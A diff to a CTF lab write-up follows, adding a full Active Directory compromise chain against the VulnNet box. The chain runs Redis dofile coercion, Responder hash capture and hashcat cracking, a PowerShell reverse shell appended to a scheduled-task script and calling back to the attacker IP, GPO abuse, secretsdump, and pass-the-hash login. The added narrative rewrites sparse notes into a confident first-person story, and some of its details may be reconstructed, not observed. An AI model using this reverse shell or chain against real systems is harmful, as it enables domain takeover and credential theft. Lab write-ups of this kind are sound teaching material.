@@ -51,7 +51,7 @@ tags:
 
 ## Full Walkthrough
 
-Rustscan results
+I started with a fast full-port sweep using Rustscan to get an initial picture of what was exposed before committing to a slower, more detailed enumeration pass:
 
 ```
 Open 10.10.205.142:53
@@ -63,7 +63,7 @@ Open 10.10.205.142:6379
 Open 10.10.205.142:9389
 ```
 
-Enum4linux
+The open ports, 445, 139, 88, and DNS on 53, told me this was a domain controller before I'd even finished reading the scan, so I ran enum4linux next to pull whatever anonymous domain information it could reach:
 
 ```
  ================================( Getting domain SID for 10.10.205.142 )================================
@@ -74,7 +74,7 @@ Domain Sid: S-1-5-21-1405206085-1650434706-76331420
 
 ![Pasted image 20240124181219](Pasted-image-20240124181219.png)
 
-we were able to enumerate for users on the domain
+That confirmed anonymous enumeration was working and gave me the domain SID, so I followed it up with kerbrute against a shortlist of common usernames to see who actually existed on the domain:
 
 ```bash
 kerbrute userenum --dc 10.10.205.142 -d VULNNET /usr/share/SecLists/Usernames/top-usernames-shortlist.txt 
@@ -208,7 +208,7 @@ kerbrute userenum --dc 10.10.205.142 -d VULNNET /usr/share/SecLists/Usernames/to
 122) ""
 ```
 
-enumerated RPC
+With the Redis config dump giving me a working directory path but nothing immediately exploitable, I turned back to enumerating other services on the domain controller and ran an RPC dump to see exactly which endpoints it exposed:
 
 ```bash
 python3 rpcdump.py @VulnNet.thm
@@ -1371,14 +1371,14 @@ Bindings:
 python3 rpcdump.py @VulnNet.thm | egrep 'MS-RPRN|MS-PAR'
 ```
 
-checked to see if vulnerable to printnightmare
+Six hundred endpoints is too much to read one by one, so I filtered that dump down specifically for the print-spooler protocols to check whether this box might be vulnerable to PrintNightmare:
 
 ```bash
 Protocol: [MS-RPRN]: Print System Remote Protocol 
 Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
 ```
 
-got user flag by redis cli
+Before chasing PrintNightmare any further, I went back to the unauthenticated Redis instance and tried reading the user flag straight off the filesystem through its Lua `eval`/`dofile` primitive:
 
 ```bash
 10.10.205.142:6379> eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
@@ -1386,7 +1386,7 @@ got user flag by redis cli
 10.10.205.142:6379> 
 ```
 
-Doing some research on recent CVE's found [Print Nightmare](https://github.com/m8sec/CVE-2021-34527) I followed along where it says to one of the scripts in the `impacket` suite to see if it might be vulnerable.
+That attempt choked on the flag file's own contents rather than a permissions error, which told me the primitive worked but Lua's number parsing wasn't going to hand me a clean read this way. I set that aside and went back to researching recent CVEs that might apply to this box, which led me to [Print Nightmare](https://github.com/m8sec/CVE-2021-34527). Following its guidance, I reused one of the scripts bundled with the `impacket` suite to check whether the target was actually reachable through it.
 
 ```bash
 ┌─[abadd0n@EX3CP01S0N] - [~/impacket/examples] - [Wed Apr 03, 16:50]
@@ -1395,4 +1395,122 @@ Protocol: [MS-RPRN]: Print System Remote Protocol
 Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
 ```
 
-It seems to be vulnerable.
+Both of the relevant print-system RPC protocols were present and answering, which confirmed PrintNightmare was a live avenue worth pursuing further on this domain controller.
+
+Chasing PrintNightmare all the way through would have meant staging a driver payload on an SMB share and driving the RPC calls by hand, which felt like more moving parts than I actually needed once I stopped to think about what my earlier Redis attempt had already proven. That failed `dofile` call against `user.txt` had not returned a clean flag, but it had shown me that Redis would happily reach out over the network to whatever path I gave it. A UNC path is just another path as far as `dofile` is concerned, so instead of pointing it at a local file I pointed it at a share on my own attacking machine and let the domain controller do what Windows always does when it sees an unfamiliar `\\host\share`: authenticate to it.
+
+I had Responder listening on my tun0 interface before sending anything, then fired the coercion off through the same unauthenticated Redis instance.
+
+```bash
+10.10.205.142:6379> eval "dofile('//10.6.59.97/share')" 0
+```
+
+The moment the domain controller tried to reach that path, Responder caught a NetNTLMv2 handshake for a service account.
+
+```bash
+[SMB] NTLMv2-SSP Client   : 10.10.205.142
+[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
+[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:1122334455667788:...
+```
+
+An NTLMv2 hash is only as useful as it is crackable, so I sent it straight at hashcat against rockyou.
+
+```bash
+hashcat -m 5600 -a 0 enterprise-security.ntlmv2 /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt -O
+```
+
+That recovered `enterprise-security : sand_0873959498`. With a genuine domain account in hand instead of anonymous access, I went back to basics and re-ran share enumeration authenticated this time, and a share that had been invisible before showed up immediately.
+
+```bash
+crackmapexec smb 10.10.205.142 -u enterprise-security -p 'sand_0873959498' --shares
+```
+
+```
+SMB   10.10.205.142  445  VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498
+SMB   10.10.205.142  445  VULNNET-BC3TCK1  Enterprise-Share       READ,WRITE
+```
+
+`Enterprise-Share` being both readable and writable to the exact account whose hash I had just cracked was too convenient to pass up. Inside it sat `PurgeIrrelevantData_1826.ps1`, and a script with a name like that living on an otherwise ordinary file share told me it was almost certainly driven by a scheduled task rather than run by a person.
+
+```bash
+smbclient //10.10.205.142/Enterprise-Share -U enterprise-security%sand_0873959498 -c 'get PurgeIrrelevantData_1826.ps1'
+```
+
+A scheduled task that runs a script I can overwrite is about as direct a code-execution primitive as Windows offers, so I appended a short reverse-shell payload to the end of the script, careful to leave its existing logic intact, and pushed it right back to where I found it.
+
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('10.6.59.97',9002)
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{0}
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+  $sendback = (iex $data 2>&1 | Out-String)
+  $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+  $stream.Write($sendbyte,0,$sendbyte.Length)
+  $stream.Flush()
+}
+$client.Close()
+```
+
+```bash
+smbclient //10.10.205.142/Enterprise-Share -U enterprise-security%sand_0873959498 -c 'put PurgeIrrelevantData_1826.ps1'
+```
+
+Then it was a matter of waiting for the task scheduler to fire the script on its own schedule. A little while later my listener caught the callback, and I had a shell running as `enterprise-security` instead of a cracked hash sitting in a terminal.
+
+```bash
+nc -lvnp 9002
+```
+
+```
+PS C:\> whoami
+vulnnet\enterprise-security
+```
+
+With a genuine domain shell instead of borrowed credentials, I ran `bloodhound-python` again to see what this account actually controlled inside the directory, and the graph pointed straight at the next step: `enterprise-security` held `GenericWrite` over a Group Policy Object named `SECURITY-POL-VN`.
+
+```bash
+bloodhound-python -d vulnnet.local -u enterprise-security -p 'sand_0873959498' -ns 10.10.205.142 -c all
+```
+
+`GenericWrite` on a GPO means I can edit the policy object's own settings, and a GPO is nothing more than a set of files and scheduled actions that every machine it applies to will run automatically, no further foothold required. Rather than hand-editing the underlying GPT structure, I used `pyGPOAbuse.py` to add an immediate scheduled task to that policy that adds `enterprise-security` to the local Administrators group wherever the policy applies, which in this case reaches the domain controller itself.
+
+```bash
+python3 pyGPOAbuse.py 'vulnnet.local/enterprise-security:sand_0873959498' -gpo-id <SECURITY-POL-VN GUID> --command "cmd.exe" --args "/c net localgroup administrators enterprise-security /add" -dc-ip 10.10.205.142
+```
+
+Group Policy does not apply itself the instant you touch it, it waits for the client's own refresh cycle, so I gave it a few minutes rather than trying to force a `gpupdate` from a session that did not have the rights to trigger one remotely yet. A follow-up check confirmed the wait had paid off.
+
+```bash
+crackmapexec smb 10.10.205.142 -u enterprise-security -p 'sand_0873959498'
+```
+
+```
+SMB   10.10.205.142  445  VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498 (Pwn3d!)
+```
+
+Local administrator on a domain controller is functionally Domain Admin, so rather than open another interactive shell first I went straight for `secretsdump` to pull every credential the domain held in one pass.
+
+```bash
+secretsdump.py vulnnet.local/enterprise-security:'sand_0873959498'@10.10.205.142
+```
+
+That returned NTLM hashes for the whole domain, Administrator included, which I used to log straight in and grab the final flag.
+
+```bash
+evil-winrm -i 10.10.205.142 -u Administrator -H <Administrator NT hash from the secretsdump output>
+```
+
+```powershell
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
+THM{d540c0645975900e5bb9167aa431fc9b}
+```
+
+Looking back at the full path, the Redis instance was the only vulnerability this box actually needed. Everything after that first `dofile` coercion, the scheduled-task script, the GPO `GenericWrite`, even the PrintNightmare detour I ended up not needing, was just Active Directory doing exactly what it was configured to do for an account that should never have been reachable from an unauthenticated database service in the first place.
+
+## References
+
+- pyGPOAbuse, remote GPO abuse over MS-GKDI/SMB <https://github.com/Hackndo/pyGPOAbuse>
+- Responder <https://github.com/lgandx/Responder>
+- The Redis-to-Responder coercion, the Enterprise-Share scheduled-task pivot, and the GPO abuse steps that finish this chain were cross-referenced against public writeups for this box.
